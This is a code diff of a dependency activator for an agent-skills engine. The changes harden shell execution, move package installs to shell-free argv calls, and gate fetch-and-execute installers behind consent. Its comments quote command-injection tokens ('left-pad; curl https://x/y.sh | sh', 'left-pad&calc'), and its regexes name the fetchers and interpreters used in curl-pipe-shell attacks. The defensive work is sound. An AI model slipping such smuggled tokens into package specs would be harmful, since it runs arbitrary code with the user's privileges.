@@ -28,6 +28,24 @@ const PLATFORM = process.platform; // 'darwin' | 'linux' | 'win32'
 const SKILLS_ROOT = process.env.NIRVANA_SKILLS_DIR
   || (fs.existsSync(path.join(os.homedir(), '.nirvana', 'skills')) ? path.join(os.homedir(), '.nirvana', 'skills') : path.join(os.homedir(), '.claude', 'skills'));
 const PATHS = require(path.join(SKILLS_ROOT, '_shared', 'lib', 'paths.js'));
+// Every dependency this file installs goes to ONE place: ~/.nirvana. deps-home
+// owns that policy — the store, the per-tool caches, and the environment that
+// makes a package manager honour them. See its header for the measurements
+// that forced the change.
+//
+// Resolved the same way PATHS is, plus a repo-relative fallback: this file runs
+// both from the deployed tree (~/.nirvana/skills) and straight out of the
+// checkout during tests, and only one of those two paths exists at a time.
+const DEPS = (() => {
+  const candidates = [
+    path.join(SKILLS_ROOT, '_shared', 'lib', 'deps-home.ts'),
+    path.resolve(__dirname, '..', '..', '_shared', 'lib', 'deps-home.ts'),
+  ];
+  for (const c of candidates) {
+    try { if (fs.existsSync(c)) return require(c); } catch { /* next */ }
+  }
+  throw new Error(`deps-home not found (looked in: ${candidates.join(', ')})`);
+})();
 const SQUADS_DIR = process.env.SQUADS_DIR || PATHS.SQUADS_DIR;
 const STATE_DIR = process.env.NIRVANA_STATE_DIR || PATHS.SQUADS_STATE_DIR;
 // When the caller (activate-squad.ts) resolved a project-scoped squad,
@@ -47,13 +65,69 @@ function readYaml(filePath) {
   catch (e) { return null; }
 }
 
-function checkCmd(cmd, opts = {}) {
+// ── Which shell runs a pack's shell lines ─────────────────────────────
+//
+// A squad's `post_install`, its `check:` commands and the bare presence probe
+// (`command -v <tool>`) are written in POSIX: `~`, `|`, `||`, `head`,
+// `>/dev/null`. On macOS and Linux `execSync` hands them to /bin/sh and they
+// work. On Windows `execSync` hands them to cmd.exe, which speaks none of that:
+// `~` stays a tilde, `head` does not exist, `command -v` is not a builtin — so
+// every string dependency read as "missing" and every POSIX hook failed, both
+// silently. Measured on the published packs (2026-09-06): 9 of the 47 Genesis
+// squads and 22 of 23 in the other packs carry such hooks.
+//
+// The engine already requires Git for Windows there (the `nrv.cmd` launcher
+// delegates to Git Bash and refuses to run without it). So the POSIX-authored
+// steps run in that same bash on Windows, and the language mismatch is gone
+// without touching a single pack or changing the hook contract. What a pack
+// wrote FOR Windows — `install.win32` — keeps running in cmd.exe, because that
+// is the shell it was written for. No Git Bash found: the old behaviour, so a
+// machine that somehow runs the activator without it is no worse off.
+let POSIX_SHELL_CACHE;
+function posixShell() {
+  if (POSIX_SHELL_CACHE !== undefined) return POSIX_SHELL_CACHE;
+  const override = process.env.NIRVANA_POSIX_SHELL;
+  if (override) { POSIX_SHELL_CACHE = fs.existsSync(override) ? override : null; return POSIX_SHELL_CACHE; }
+  if (PLATFORM !== 'win32') { POSIX_SHELL_CACHE = null; return null; } // execSync already uses /bin/sh
+  const candidates = [
+    process.env.ProgramFiles && path.join(process.env.ProgramFiles, 'Git', 'bin', 'bash.exe'),
+    process.env['ProgramFiles(x86)'] && path.join(process.env['ProgramFiles(x86)'], 'Git', 'bin', 'bash.exe'),
+    process.env.LOCALAPPDATA && path.join(process.env.LOCALAPPDATA, 'Programs', 'Git', 'bin', 'bash.exe'),
+  ].filter(Boolean);
   try {
-    execSync(cmd, { stdio: 'pipe', timeout: opts.timeoutMs || 30000 });
-    return { ok: true };
+    const w = spawnSync('where.exe', ['git'], { encoding: 'utf8', windowsHide: true });
+    for (const line of String(w.stdout || '').split(/\r?\n/)) {
+      const g = line.trim();
+      if (g) candidates.push(path.resolve(path.dirname(g), '..', 'bin', 'bash.exe'));
+    }
+  } catch { /* no git on PATH */ }
+  POSIX_SHELL_CACHE = candidates.find((c) => { try { return fs.statSync(c).isFile(); } catch { return false; } }) || null;
+  return POSIX_SHELL_CACHE;
+}
+
+// Runs one shell line and returns the execSync shape, through the POSIX shell
+// when `posix` is asked for and one exists, through the platform default
+// otherwise. Never throws.
+function shellExec(cmd, { posix = false, stdio = 'pipe', timeoutMs, cwd, env } = {}) {
+  const shell = posix ? posixShell() : null;
+  try {
+    if (shell) {
+      const r = spawnSync(shell, ['-c', cmd], { stdio, timeout: timeoutMs, cwd: cwd || undefined, env, encoding: 'utf8', windowsHide: true });
+      if (r.error) return { ok: false, error: r.error.message, code: r.status, stderr: r.stderr || null };
+      if ((r.status ?? 1) !== 0) return { ok: false, error: `Command failed (exit ${r.status}): ${cmd}`, code: r.status, stderr: r.stderr || null };
+      return { ok: true, output: r.stdout || '' };
+    }
+    const out = execSync(cmd, { stdio, timeout: timeoutMs, cwd: cwd || undefined, env });
+    return { ok: true, output: out ? out.toString() : '' };
   } catch (e) {
-    return { ok: false, error: e.message };
+    return { ok: false, error: e.message, code: e.status, stderr: e.stderr ? e.stderr.toString() : null };
   }
+}
+
+// Presence and `check:` commands are POSIX-authored in every pack.
+function checkCmd(cmd, opts = {}) {
+  const r = shellExec(cmd, { posix: true, stdio: 'pipe', timeoutMs: opts.timeoutMs || 30000, env: DEPS.depsEnv(process.env) });
+  return r.ok ? { ok: true } : { ok: false, error: r.error };
 }
 
 function runCmd(cmd, opts = {}) {
@@ -61,17 +135,111 @@ function runCmd(cmd, opts = {}) {
   // an automation agent can see brew/git/pip progress in real time.
   const verbose = process.env.MAESTRO_ACTIVATOR_VERBOSE === '1';
   const stdio = verbose ? 'inherit' : (opts.silent ? 'pipe' : 'pipe');
-  try {
-    const out = execSync(cmd, {
-      stdio,
-      timeout: opts.timeoutMs || 600000,
-      cwd: opts.cwd || undefined,
-      env: { ...process.env, ...(opts.env || {}) },
-    });
-    return { ok: true, output: out ? out.toString() : '' };
-  } catch (e) {
-    return { ok: false, error: e.message, code: e.status, stderr: e.stderr ? e.stderr.toString() : null };
+  return shellExec(cmd, {
+    posix: opts.posix === true,
+    stdio,
+    timeoutMs: opts.timeoutMs || 600000,
+    cwd: opts.cwd || undefined,
+    // depsEnv FIRST, then the caller's overrides: a shell line from
+    // `system[].install` or `post_install` inherits the pinned caches, so a
+    // `npx puppeteer browsers install chrome` buried in a squad's hook lands
+    // in ~/.nirvana/cache/puppeteer like everything else.
+    env: { ...DEPS.depsEnv(process.env), ...(opts.env || {}) },
+  });
+}
+
+// A package list is DATA. `runCmd` builds a shell string, which is right for
+// `system[].install.<platform>` — a squad author writes `brew install ffmpeg`
+// there on purpose, behind the sudo / heavy-download consent gate — and wrong
+// for `node:` and `python:`, whose entries are package tokens. Joined into a
+// shell line, `- "left-pad; curl https://x/y.sh | sh"` stopped being a package
+// name and became a second command, run by `nrv activate` with the user's own
+// privileges. Quoting is not the fix either: the pip branch wrapped tokens in
+// single quotes and an apostrophe inside a token still closed them.
+//
+// runArgv passes an argv ARRAY with no shell, so on macOS and Linux a token can
+// only ever be one argument. Windows needs one more step, and leaving it to the
+// runtime is what makes it dangerous.
+//
+// `pip`, `uv`, `curl` and `huggingface-cli` are real executables on Windows, so
+// those paths spawn directly, with no shell anywhere. `npm`, `pnpm` and `yarn`
+// ship as `.cmd` shims that no runtime starts without a shell — and the runtime
+// will NOT quote the token for us. libuv quotes an argument only when it holds a
+// space, tab or double quote:
+//
+//     if (NULL == wcspbrk(source, L" \t\"")) { /* No quotation needed */ }
+//                                                (libuv, src/win/process.c)
+//
+// `@remotion/cli@^4.0.0` — a real spec, shipped today in creative-studio and
+// genesis-circle — has none of the three, so it reaches cmd.exe raw, cmd eats
+// `^` as its own escape character, and npm silently installs
+// `@remotion/cli@4.0.0`. A different range, no error, nobody told. Swap the
+// payload and the same hole runs `calc`: `left-pad&calc`.
+//
+// So the command line is built HERE, with every argument quoted, and handed to
+// the runtime's shell path, which on Windows is `cmd.exe /d /s /c "<line>"`.
+// `/s` strips the outer pair the runtime adds and leaves ours standing, so cmd
+// sees each token quoted and `^`, `&`, `|`, `<`, `>`, `(`, `)` are data inside
+// it. Four characters survive no quoting cmd.exe understands and are refused
+// instead: `"` closes the quoting, `%` expands inside quotes, `!` expands when
+// delayed expansion is on, and a newline ends the line. No spec in the shipped
+// packs carries any of them; every metacharacter that appears in a real one
+// (`^`, `>`, `|`, `[`, `]`) passes through as data.
+const WINDOWS_UNQUOTABLE = /["%!\r\n]/;
+
+/**
+ * The cmd.exe line for an argv, or the token that cannot be quoted into one.
+ * Exported for test: this is the whole Windows decision, and the spawn it feeds
+ * cannot be exercised from a POSIX runner.
+ */
+function windowsShellPlan(argv) {
+  for (const a of argv) {
+    const m = WINDOWS_UNQUOTABLE.exec(String(a));
+    if (m) return { ok: false, char: m[0], token: String(a) };
   }
+  // The program name is left bare: a leading quote is what makes cmd apply its
+  // own stripping rules to the rest of the line. Every argument after it is
+  // quoted unconditionally, so the rule holds for tokens and flags alike.
+  return { ok: true, line: [argv[0], ...argv.slice(1).map(a => `"${a}"`)].join(' ') };
+}
+
+function runArgv(argv, opts = {}) {
+  const verbose = process.env.MAESTRO_ACTIVATOR_VERBOSE === '1';
+  const common = {
+    stdio: verbose ? 'inherit' : 'pipe',
+    timeout: opts.timeoutMs || 600000,
+    cwd: opts.cwd || undefined,
+    env: { ...DEPS.depsEnv(process.env), ...(opts.env || {}) },
+    windowsHide: true,
+  };
+  let r;
+  // `windowsShim: true` marks the callers whose program is a `.cmd` on Windows.
+  // Everyone else spawns argv directly on every platform.
+  if (PLATFORM === 'win32' && opts.windowsShim) {
+    const plan = windowsShellPlan(argv);
+    if (!plan.ok) {
+      return { ok: false, error:
+        `refused on Windows: the token ${JSON.stringify(plan.token)} contains ${JSON.stringify(plan.char)}, ` +
+        `which survives no quoting cmd.exe understands, and ${argv[0]} can only be started through cmd.exe there. ` +
+        `Every other character, ^ and > and | included, is passed as data. ` +
+        `Drop that one from the spec, or run the install yourself and re-activate.` };
+    }
+    r = spawnSync(plan.line, { ...common, shell: true });
+  } else {
+    r = spawnSync(argv[0], argv.slice(1), { ...common, shell: false });
+  }
+  if (r.error) return { ok: false, error: r.error.message };
+  if (r.signal) return { ok: false, error: `${argv[0]} killed by ${r.signal}`, code: null, stderr: r.stderr ? r.stderr.toString() : null };
+  if (r.status !== 0) {
+    return { ok: false, error: `${argv[0]} exited ${r.status}`, code: r.status, stderr: r.stderr ? r.stderr.toString() : null };
+  }
+  return { ok: true, output: r.stdout ? r.stdout.toString() : '' };
+}
+
+// Human-readable rendering of an argv, for `--dry-run` output and error text
+// ONLY. Nothing executes this string — that is the point of runArgv.
+function displayCmd(argv) {
+  return argv.map(a => (/[^\w@.\-+=/:]/.test(a) ? `'${a.replace(/'/g, "'\\''")}'` : a)).join(' ');
 }
 
 function ensureDir(p) {
@@ -82,6 +250,19 @@ function expandPath(p) {
   if (!p) return p;
   if (p.startsWith('~')) return path.join(HOME, p.slice(1));
   return p;
+}
+
+// Is this destination inside the one directory the engine is allowed to fill?
+// Model weights and cloned services are dependencies too — they just arrive as
+// files instead of packages — so an absolute path outside ~/.nirvana is
+// reported rather than silently obeyed. It is not blocked: a squad that
+// installs a real application (ComfyUI) at a path its own scripts expect has a
+// reason, and the operator can see the exception in the activation record.
+function outsideNirvana(dir) {
+  if (!dir) return false;
+  const root = path.resolve(DEPS.nirvanaHome());
+  const target = path.resolve(dir);
+  return target !== root && !target.startsWith(root + path.sep);
 }
 
 function getStatePath(slug) {
@@ -147,6 +328,75 @@ function allChecksPass(norm) {
   return norm.checks.every(c => checkCmd(c).ok);
 }
 
+// Fetch-and-execute detection for `system[].install.<platform>`.
+//
+// That field IS a shell line by design — `brew install ffmpeg` is what a squad
+// author should write there — and the consent gate in front of it only ever
+// matched `sudo`. So `curl -fsSL https://bun.sh/install | bash`, which ships
+// today in brandcraft and grok-studio-nirvana, ran on the buyer's machine with
+// no prompt at all: a third party's script, fetched and executed, because
+// someone asked to install dependencies. The exit-code contract already
+// promised 2 for "heavy installs", so this fills a promise rather than
+// inventing one.
+//
+// The line the detector draws is fetch-and-EXECUTE. Downloading is not
+// executing: `curl -o model.bin <url>`, `brew install`, `apt-get install` and
+// `winget install` stay untouched, because a gate that fires on ordinary
+// installs is a gate everyone learns to pass with --confirm-heavy without
+// reading it.
+const FETCHERS = String.raw`curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod`;
+const INTERPRETERS = String.raw`bash|sh|zsh|dash|ksh|fish|python3?|perl|ruby|iex|Invoke-Expression`;
+// Anything that runs a file, for the two-step shape: the interpreters above plus
+// the ones that only ever appear as stage two (`node`, `powershell`, `msiexec`,
+// `installer`) and a bare `./thing`.
+const RUNNERS = String.raw`bash|sh|zsh|dash|ksh|fish|python3?|node|perl|ruby|powershell|pwsh|msiexec|installer|iex|Invoke-Expression`;
+// Command position: start of line, or after `;`, `&`, `&&`, `|`, `||`, `(` or a
+// newline, with any `sudo -E` / `env -i` / `exec` prefix skipped. Without this
+// anchor, a PATH like `/tmp/sh` would read as an invocation of `sh`.
+const CMD_POSITION = String.raw`(?:^|[;&|(\n])\s*(?:(?:sudo|env|command|exec)(?:\s+-{1,2}\S+)*\s+)*`;
+const URL_IN_COMMAND = /https?:\/\/[^\s'"|)>]+/i;
+const FETCHER_PRESENT = new RegExp(String.raw`\b(?:${FETCHERS})\b`, 'i');
+
+const DIRECT_FORMS = [
+  // curl … | bash · wget -qO- … | sh · irm … | iex · … | sudo -E bash -
+  // The prefix group matters: `| sudo -E bash -` is the nodesource shape, and a
+  // detector that only allowed a bare `sudo` would wave it through.
+  new RegExp(String.raw`\b(?:${FETCHERS})\b[\s\S]*?\|\s*(?:(?:sudo|env|command|exec)(?:\s+-{1,2}\S+)*\s+)*(${INTERPRETERS})\b`, 'i'),
+  // bash <(curl …) · sh <(wget …)
+  new RegExp(String.raw`\b(${INTERPRETERS})\b[^\n]*?<\(\s*(?:${FETCHERS})\b`, 'i'),
+  // sh -c "$(curl …)" · eval "$(curl …)" · eval `curl …`
+  new RegExp(String.raw`\b(${INTERPRETERS}|eval)\b[^\n]*?(?:\$\(|` + '`' + String.raw`)\s*(?:${FETCHERS})\b`, 'i'),
+];
+
+// The two-step shape, which is the COMMON one in the wild: download an installer,
+// then run it. `ebook-maestro-nirvana` ships it today in genesis-circle and
+// publishing-knowledge — curl a zip, unzip it, `sh` the file that came out — and
+// no pipe or substitution appears anywhere in it. The risk is identical to
+// `curl | bash`: if the host is compromised, the buyer runs whatever it served.
+const TWO_STAGE_RUN = new RegExp(CMD_POSITION + String.raw`(?:(${RUNNERS})\b|(\.{1,2}\/\S+))`, 'i');
+
+/**
+ * `{ url, shell, form }` when the command downloads something and runs it, else
+ * null. `form` is the confidence, and it reaches the buyer: `direct` is a pipe
+ * or a substitution and is not arguable; `two_stage` is a fetch and a runner in
+ * the same command, which is a strong signal rather than a proof.
+ *
+ * Exported for test: the corpus it has to judge is the 232 install commands in
+ * the shipped packs, and judging them must not mean running them.
+ */
+function fetchAndExecute(cmd) {
+  const text = String(cmd || '');
+  const url = URL_IN_COMMAND.exec(text);
+  for (const form of DIRECT_FORMS) {
+    const m = form.exec(text);
+    if (m) return { url: url ? url[0] : null, shell: m[1], form: 'direct' };
+  }
+  if (!url || !FETCHER_PRESENT.test(text)) return null;
+  const run = TWO_STAGE_RUN.exec(text);
+  if (!run) return null;
+  return { url: url[0], shell: run[1] || run[2], form: 'two_stage' };
+}
+
 function installSystem(dep, dryRun, confirmHeavy) {
   // Bare prereq string (e.g. "ffmpeg >= 6.0", "node >= 20"): we can only verify
   // presence — auto-installing a system tool needs a package-manager mapping we
@@ -179,18 +429,39 @@ function installSystem(dep, dryRun, confirmHeavy) {
   // sudo binary, and root does not need it). Running unprivileged, a sudo
   // command requires --confirm-heavy — the same consent gate as large
   // downloads — otherwise it is a confirmation_required item (exit 2).
+  //
+  // Fetching a remote script and executing it goes through the SAME gate, for
+  // the same reason: it is the machine doing something the person who typed
+  // `nrv activate` did not see coming. Both reasons are reported together, and
+  // the item carries the exact command, because that is the only thing the
+  // buyer can actually decide on.
   let effectiveCmd = installCmd;
   const needsSudo = /(^|\s|&&|\|\||;)\s*sudo\s+/.test(installCmd);
   const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
+  const fetchExec = fetchAndExecute(installCmd);
   if (needsSudo && isRoot) {
     effectiveCmd = installCmd.replace(/(^|\s|&&|\|\||;)(\s*)sudo\s+/g, '$1$2');
-  } else if (needsSudo && !confirmHeavy) {
+  }
+  const reasons = [];
+  if (needsSudo && !isRoot) reasons.push('runs as root through sudo');
+  if (fetchExec) {
+    reasons.push(fetchExec.form === 'direct'
+      ? `downloads ${fetchExec.url || 'a remote address'} and executes it with ${fetchExec.shell}`
+      : `downloads ${fetchExec.url} and then runs ${fetchExec.shell} in the same command — two steps rather than a pipe, so read it before accepting`);
+  }
+  if (reasons.length > 0 && !confirmHeavy) {
     return {
       name: dep.name,
       status: 'confirmation_required',
       kind: 'system',
       cmd: installCmd,
-      reason: 'Install command needs sudo. Re-run with --confirm-heavy to accept (or install it yourself and re-activate).',
+      needs_sudo: needsSudo && !isRoot,
+      fetches: fetchExec ? fetchExec.url : null,
+      executes_with: fetchExec ? fetchExec.shell : null,
+      execution_form: fetchExec ? fetchExec.form : null,
+      reason: `Consent needed before this runs: it ${reasons.join(', and it ')}.\n`
+        + `  ${installCmd}\n`
+        + `  Re-run with --confirm-heavy to accept it, or install it yourself and re-activate.`,
     };
   }
   const installResult = runCmd(effectiveCmd);
@@ -205,31 +476,174 @@ function installSystem(dep, dryRun, confirmHeavy) {
   };
 }
 
-function installPython(spec, dryRun) {
+// ─────────────────────────────────────────────────────────────────────
+// Python: which interpreter, where packages go, how presence is proven.
+//
+// The premise is a machine we know nothing about: bun is there, "probably" a
+// node and a python, and no idea which. Everything below follows from that.
+//
+// WHICH INTERPRETER. Never a name, always a proof. Each candidate has to RUN a
+// one-line program that prints its version and its own path, and only the
+// first that does, at Python 3.8 or newer, is used. Measured on the
+// maintainer's machine: `python` on PATH was a shim that printed
+// "Failed to locate 'python'" and exited 1, ahead of a working `python3`; a
+// name-based pick takes the broken one, a proof-based pick skips it. On
+// Windows `python3.exe` on a stock machine is the Microsoft Store alias — a
+// 0-byte reparse point that opens the Store and exits non-zero — so it is
+// tried LAST there, after the `py` launcher python.org installs and `python`.
+//
+// WHERE PACKAGES GO. A venv under ~/.nirvana/python, not `pip install --user`.
+// PEP 668 (Debian 12, Ubuntu 23.04+, Fedora 38+, Arch, Homebrew) refuses
+// `--user` into a distro Python with `externally-managed-environment`, so the
+// old install path failed outright on a large share of modern machines. And a
+// venv means check and install share ONE interpreter by construction, where the
+// old code probed `pip --version` and installed into whatever Python that pip
+// belonged to, never having asked.
+//
+// HOW PRESENCE IS PROVEN. `<venv python> -m pip install --dry-run --no-index
+// --report - <tokens>`: pip's own resolver answering "would anything be
+// installed?", version specifiers honoured (PEP 440, `pillow >= 10.0` is a
+// real constraint), no network, no import names (pyyaml → yaml, pillow → PIL,
+// scikit-learn → sklearn, all sidestepped because pip speaks distribution
+// names). Measured: satisfied → exit 0 and an empty `install` in 1.1 s;
+// missing or too low → exit 1 in 0.25 s. Needs pip >= 22.2; an older pip
+// rejects the flag, and that answer is "not proven", which means install. The
+// only answer that skips the installer is a proof.
+//
+// uv, WHEN PRESENT. uv is what the ecosystem converged on for exactly this: it
+// discovers interpreters by querying them, creates the venv, downloads a Python
+// when the machine has none, and installs faster. It is preferred whenever it
+// is on PATH and never fetched here — the standalone installer is `curl | sh`,
+// which the fetch-and-execute gate above exists to stop on a buyer's machine.
+// A squad that needs it declares it under `system:` like any other tool.
+// ─────────────────────────────────────────────────────────────────────
+
+const PY_MIN_MAJOR = 3;
+const PY_MIN_MINOR = 8;   // importlib.metadata; below this no proof is possible
+const PY_PROBE = 'import sys; print("%d.%d %s" % (sys.version_info[0], sys.version_info[1], sys.executable))';
+const HINT_NO_PYTHON = 'Install Python 3.8+ from python.org or your package manager, or install uv (brew install uv · winget install astral-sh.uv · pipx install uv), then run nrv activate again.';
+const HINT_VENV = 'The venv could not be created. On Debian/Ubuntu the venv module is a separate package: sudo apt install python3-venv. Installing uv also works — it creates the venv without that package.';
+
+/** Candidate argv prefixes, most trustworthy first. Exported for test. */
+function pythonCandidates(platform = PLATFORM) {
+  return platform === 'win32'
+    ? [['py', '-3'], ['python'], ['python3']]
+    : [['python3'], ['python']];
+}
+
+let pythonMemo;   // undefined = not probed yet · null = nothing usable · {exe, version, via}
+function discoverPython() {
+  if (pythonMemo !== undefined) return pythonMemo;
+  pythonMemo = null;
+  for (const cand of pythonCandidates()) {
+    const r = runArgv([...cand, '-c', PY_PROBE], { timeoutMs: 15000 });
+    if (!r.ok) continue;
+    const m = /^(\d+)\.(\d+) (.+)$/m.exec(String(r.output).trim());
+    if (!m) continue;
+    const major = Number(m[1]), minor = Number(m[2]);
+    if (major < PY_MIN_MAJOR || (major === PY_MIN_MAJOR && minor < PY_MIN_MINOR)) continue;
+    pythonMemo = { exe: m[3].trim(), version: `${major}.${minor}`, via: cand.join(' ') };
+    break;
+  }
+  return pythonMemo;
+}
+
+let uvMemo;
+function uvAvailable() {
+  if (uvMemo === undefined) uvMemo = runArgv(['uv', '--version'], { timeoutMs: 15000 }).ok;
+  return uvMemo;
+}
+
+function venvReady(venvDir) {
+  return fs.existsSync(path.join(venvDir, 'pyvenv.cfg')) && fs.existsSync(DEPS.venvPython(venvDir));
+}
+
+/**
+ * The venv at `venvDir`, created if absent. uv creates it when present
+ * (`--seed` puts pip inside, so the dry-run proof works the same way in both
+ * kinds of venv; `--no-project` keeps a stray .python-version in cwd out of
+ * the decision); otherwise the discovered interpreter's `-m venv`. Returns
+ * {ok, venv, python, created} or {ok:false, error, hint, unavailable?}.
+ */
+function ensureVenv(venvDir, dryRun) {
+  const python = DEPS.venvPython(venvDir);
+  if (venvReady(venvDir)) return { ok: true, venv: venvDir, python, created: false };
+  let argv, via;
+  if (uvAvailable()) {
+    argv = ['uv', 'venv', '--seed', '--no-project', venvDir]; via = 'uv';
+  } else {
+    const py = discoverPython();
+    if (!py) return { ok: false, unavailable: true, error: 'no usable Python 3.8+ answered on PATH, and uv is not installed', hint: HINT_NO_PYTHON };
+    argv = [py.exe, '-m', 'venv', venvDir]; via = py.via;
+  }
+  if (dryRun) return { ok: true, venv: venvDir, python, created: false, would_create: displayCmd(argv), argv };
+  ensureDir(path.dirname(venvDir));
+  const r = runArgv(argv);
+  if (!r.ok) return { ok: false, error: r.error, hint: HINT_VENV };
+  return { ok: true, venv: venvDir, python, created: true, via };
+}
+
+/** pip's own answer to "is every token already satisfied here?". Only exit 0
+ *  with an empty `install` list is a proof; every other outcome — a missing
+ *  package, a version below its specifier, a pip too old for `--dry-run`, an
+ *  unreadable report — is "not proven", and not proven means install. */
+function pythonPresent(pythonExe, tokens) {
+  const r = runArgv([pythonExe, '-m', 'pip', 'install', '--dry-run', '--no-index', '--quiet', '--report', '-', ...tokens], { timeoutMs: 120000 });
+  if (!r.ok) return { present: false, reason: r.code == null ? 'pip did not run' : 'not satisfied, or pip predates --dry-run (22.2)' };
+  try {
+    const report = JSON.parse(String(r.output));
+    const n = Array.isArray(report.install) ? report.install.length : -1;
+    if (n === 0) return { present: true };
+    return { present: false, reason: n > 0 ? `${n} package(s) would be installed` : 'unreadable report' };
+  } catch {
+    return { present: false, reason: 'unreadable report' };
+  }
+}
+
+function installPython(spec, dryRun, squadDir) {
   const norm = normalizeDepSpec(spec, 'pip');
   if (!norm) return { status: 'no_python_deps' };
   const tokens = norm.raw.map(x => depToToken(x, 'pip')).filter(Boolean);
   if (tokens.length === 0) return { status: 'no_python_deps' };
-  if (allChecksPass(norm)) return { status: 'already_present', kind: 'python', packages: tokens };
-  const manager = norm.manager === 'uv' ? 'uv' : 'pip';
-  const target = expandPath((!Array.isArray(spec) && (spec.target_dir || (spec.use_squad_venv ? '.venv' : null))) || null);
+  // The author's explicit `check:` on every entry still wins, unchanged.
+  if (allChecksPass(norm)) return { status: 'already_present', kind: 'python', packages: tokens, via: 'check' };
 
-  let cmd;
-  if (manager === 'uv') {
-    cmd = `uv pip install ${tokens.map(p => `'${p}'`).join(' ')}`;
-  } else {
-    // pip vs pip3 fallback (macOS system python often only ships pip3); --user
-    // when there is no explicit target dir/venv so it works on managed pythons.
-    const pipBin = checkCmd('pip --version').ok ? 'pip' : (checkCmd('pip3 --version').ok ? 'pip3' : 'pip');
-    const userFlag = target ? '' : ' --user';
-    cmd = `${pipBin} install${userFlag} ${tokens.map(p => `'${p}'`).join(' ')}`;
+  // `use_squad_venv` is the author's deliberate isolation choice and is
+  // honoured: the venv lives inside the squad. Everything else shares one.
+  const isolated = !Array.isArray(spec) && !!spec.use_squad_venv;
+  const venvDir = isolated ? path.join(squadDir || process.cwd(), '.venv') : DEPS.pythonVenv();
+
+  const env = ensureVenv(venvDir, dryRun);
+  if (!env.ok) {
+    if (env.unavailable) return { status: 'python_unavailable', kind: 'python', packages: tokens, error: env.error, hint: env.hint };
+    return { status: 'install_failed', kind: 'python', packages: tokens, venv: venvDir, error: env.error, hint: env.hint };
   }
-  if (dryRun) return { status: 'would_install', kind: 'python', manager, cmd };
-  const r = runCmd(cmd, { cwd: target });
+
+  // A venv that exists may already hold everything. One we just created, or
+  // would create, cannot, so the proof is skipped rather than run against
+  // nothing.
+  let notProven = null;
+  if (!env.created && !env.would_create) {
+    const proof = pythonPresent(env.python, tokens);
+    if (proof.present) return { status: 'already_present', kind: 'python', packages: tokens, venv: env.venv, via: 'pip-dry-run' };
+    notProven = proof.reason;
+  }
+
+  const manager = uvAvailable() ? 'uv' : 'pip';
+  const argv = manager === 'uv'
+    ? ['uv', 'pip', 'install', '--python', env.python, ...tokens]
+    : [env.python, '-m', 'pip', 'install', ...tokens];
+  if (dryRun) {
+    return { status: 'would_install', kind: 'python', manager, venv: env.venv, home: env.venv, python: env.python,
+             would_create_venv: env.would_create || null, not_proven: notProven, cmd: displayCmd(argv), argv, packages: tokens };
+  }
+  const r = runArgv(argv);
   return {
     status: r.ok ? 'installed' : 'install_failed',
     kind: 'python',
     manager,
+    venv: env.venv,
+    python: env.python,
     packages: tokens,
     error: r.ok ? null : r.error,
   };
@@ -241,17 +655,51 @@ function installNode(spec, dryRun, squadDir) {
   const tokens = norm.raw.map(x => depToToken(x, 'npm')).filter(Boolean);
   if (tokens.length === 0) return { status: 'no_node_deps' };
   if (allChecksPass(norm)) return { status: 'already_present', kind: 'node', manager: norm.manager, global: norm.global, packages: tokens };
-  const manager = norm.manager || 'npm';
   const g = norm.global;
-  const cmd = manager === 'pnpm' ? `pnpm add${g ? ' -g' : ''} ${tokens.join(' ')}`
-            : manager === 'yarn' ? `yarn ${g ? 'global add' : 'add'} ${tokens.join(' ')}`
-            : `npm install${g ? ' -g' : ''} ${tokens.join(' ')}`;
-  if (dryRun) return { status: 'would_install', kind: 'node', manager, global: g, cmd };
-  // Local installs default to the squad's OWN dir, so npm never pollutes the
-  // ~/squads root with a stray node_modules/package-lock. An explicit spec.cwd
-  // (object form) still wins; global installs (-g) ignore cwd.
-  const r = runCmd(cmd, { cwd: g ? undefined : (expandPath(!Array.isArray(spec) ? spec.cwd : null) || squadDir) });
-  return { status: r.ok ? 'installed' : 'install_failed', kind: 'node', manager, global: g, packages: tokens, error: r.ok ? null : r.error };
+
+  // GLOBAL installs are the carve-out and stay as they are: `npm i -g wrangler`
+  // asks for a command on the machine's PATH, which is the same class as
+  // `brew install ffmpeg`. Redirecting those would put binaries somewhere
+  // nothing looks, and setting npm_config_prefix to fix that breaks nvm.
+  if (g) {
+    const manager = norm.manager || 'npm';
+    const argv = manager === 'pnpm' ? ['pnpm', 'add', '-g', ...tokens]
+               : manager === 'yarn' ? ['yarn', 'global', 'add', ...tokens]
+               : ['npm', 'install', '-g', ...tokens];
+    if (dryRun) return { status: 'would_install', kind: 'node', manager, global: true, cmd: displayCmd(argv), argv };
+    const r = runArgv(argv, { windowsShim: true });
+    return { status: r.ok ? 'installed' : 'install_failed', kind: 'node', manager, global: true, packages: tokens, error: r.ok ? null : r.error };
+  }
+
+  // LOCAL installs go to the shared store at ~/.nirvana/node_modules, never to
+  // the squad. This used to run the package manager inside the squad dir on the
+  // reasoning that it kept the ~/squads ROOT clean — which it did, by writing
+  // one full tree per squad instead. brandcraft alone cost 276 MB there, and
+  // its byte-identical twin in the pack source cost another 276 MB.
+  //
+  // `spec.cwd` is now advisory: a squad that declares
+  // `cwd: "${SQUADS_DIR}/<slug>"` (the shape the old template taught) gets the
+  // store anyway, and the ignored value is reported so the author can drop it.
+  const declaredCwd = expandPath(!Array.isArray(spec) ? spec.cwd : null);
+  if (dryRun) {
+    const plan = DEPS.install(tokens, { dryRun: true });
+    return { status: 'would_install', kind: 'node', manager: 'bun', global: false, store: DEPS.depsStore(), cmd: plan.cmd, argv: plan.argv, packages: tokens, ignored_cwd: declaredCwd || null };
+  }
+  const res = DEPS.install(tokens);
+  // The squad still has to RESOLVE what was installed. One symlink does that
+  // for every runtime and loader, and keeps a single physical copy on disk.
+  const linked = squadDir ? DEPS.link(squadDir) : { status: 'skipped' };
+  return {
+    status: res.status === 'failed' ? 'install_failed' : (res.status === 'already_present' ? 'already_present' : 'installed'),
+    kind: 'node',
+    manager: 'bun',
+    global: false,
+    store: DEPS.depsStore(),
+    packages: tokens,
+    linked: linked.status,
+    ignored_cwd: declaredCwd || null,
+    error: res.error || null,
+  };
 }
 
 // Sub-app installer: some squads ship self-contained sub-projects with their
@@ -268,21 +716,47 @@ function installSubApps(squadDir, dryRun) {
   for (const e of entries) {
     if (!e.isDirectory() || e.name.startsWith('.') || SUBAPP_SKIP.has(e.name)) continue;
     const sub = path.join(squadDir, e.name);
-    if (!fs.existsSync(path.join(sub, 'package.json'))) continue;
